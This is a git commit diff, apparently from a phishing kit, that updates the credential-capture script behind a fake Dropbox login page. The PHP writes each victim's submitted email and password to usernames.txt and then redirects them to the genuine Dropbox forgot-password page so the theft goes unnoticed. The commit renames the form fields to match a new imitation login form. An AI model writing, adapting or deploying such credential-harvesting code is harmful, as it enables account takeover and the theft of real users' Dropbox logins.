f4dc7fc76347566cb727c41797961146e0ddd6f9
htr-tech <tahmidrayat@gmail.com>
2022-12-29 21:29:08 +0600

    New DropBox Login Page

--- .sites/dropbox/login.php
+++ .sites/dropbox/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Dropbox Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Dropbox Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
 header('Location: https://www.dropbox.com/forgot/');
 exit();
 ?>
